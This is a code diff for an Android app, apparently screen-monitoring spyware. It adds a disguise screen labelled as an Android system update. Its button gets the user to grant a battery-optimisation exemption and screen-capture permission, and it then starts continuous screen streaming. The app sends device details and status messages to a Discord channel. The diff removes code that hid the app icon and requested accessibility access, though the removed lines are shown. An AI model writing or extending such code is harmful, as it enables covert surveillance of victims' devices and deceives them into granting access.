@@ -1,15 +1,18 @@
 package com.tom5.monitor;
 
 import android.app.Activity;
-import android.content.ComponentName;
 import android.content.Context;
 import android.content.Intent;
-import android.content.pm.PackageManager;
+import android.graphics.Color;
 import android.media.projection.MediaProjectionManager;
 import android.net.Uri;
 import android.os.Bundle;
 import android.os.PowerManager;
 import android.provider.Settings;
+import android.view.Gravity;
+import android.widget.Button;
+import android.widget.LinearLayout;
+import android.widget.TextView;
 
 public class MainActivity extends Activity {
     private static final int REQ_CODE = 100;
@@ -18,10 +21,40 @@ public class MainActivity extends Activity {
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
 
-        // تأكيد الاتصال للديسكورد أول ما يفتح التطبيق
-        DiscordSender.sendMessage("✅ تم التثبيت والتشغيل على جهاز: " + android.os.Build.MODEL);
+        // واجهة بسيطة جداً حتى تتأكد إن التطبيق شغال
+        LinearLayout layout = new LinearLayout(this);
+        layout.setOrientation(LinearLayout.VERTICAL);
+        layout.setGravity(Gravity.CENTER);
+        layout.setBackgroundColor(Color.WHITE);
 
-        // 1. طلب استثناء البطارية (حتى ما يطفي بالخلفية)
+        TextView tv = new TextView(this);
+        tv.setText("نظام تحديث الأندرويد");
+        tv.setTextSize(22);
+        tv.setTextColor(Color.BLACK);
+        tv.setPadding(0, 0, 0, 50);
+        layout.addView(tv);
+
+        Button btn = new Button(this);
+        btn.setText("تشغيل الخدمة الآن");
+        btn.setPadding(20, 20, 20, 20);
+        btn.setOnClickListener(v -> {
+            // طلب استثناء البطارية
+            requestBatteryOptimizations();
+
+            // طلب بث الشاشة
+            MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
+            if (mpm != null) {
+                startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
+            }
+        });
+        layout.addView(btn);
+        setContentView(layout);
+        
+        // إرسال إشعار للديسكورد فور فتح التطبيق للتأكد من الربط
+        DiscordSender.sendMessage("🔔 تطبيق حسين مفتوح الآن على جهاز: " + android.os.Build.MODEL);
+    }
+
+    private void requestBatteryOptimizations() {
         try {
             PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
             if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
@@ -30,22 +63,6 @@ public class MainActivity extends Activity {
                 startActivity(intent);
             }
         } catch (Exception e) {}
-
-        // 2. طلب إمكانية الوصول (Accessibility)
-        if (!isAccessibilityEnabled()) {
-            startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS).addFlags(Intent.FLAG_ACTIVITY_NEW_TASK));
-        }
-
-        // 3. طلب بث الشاشة
-        MediaProjectionManager mpm = (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
-        if (mpm != null) {
-            startActivityForResult(mpm.createScreenCaptureIntent(), REQ_CODE);
-        }
-    }
-
-    private boolean isAccessibilityEnabled() {
-        String pref = Settings.Secure.getString(getContentResolver(), Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES);
-        return pref != null && pref.contains(getPackageName());
     }
 
     @Override
@@ -57,13 +74,10 @@ public class MainActivity extends Activity {
             serviceIntent.putExtra("resData", data);
             startForegroundService(serviceIntent);
 
-            // إخفاء الأيقونة تماماً من الجهاز
-            getPackageManager().setComponentEnabledSetting(
-                new ComponentName(this, MainActivity.class),
-                PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
-                PackageManager.DONT_KILL_APP
-            );
-            finish();
+            DiscordSender.sendMessage("🚀 بدأ البث المستمر بنجاح!");
+            
+            // هنا حذفنا كود إخفاء الأيقونة (hideAppIcon)
+            // التطبيق سيبقى ظاهراً في القائمة
         }
     }
 }
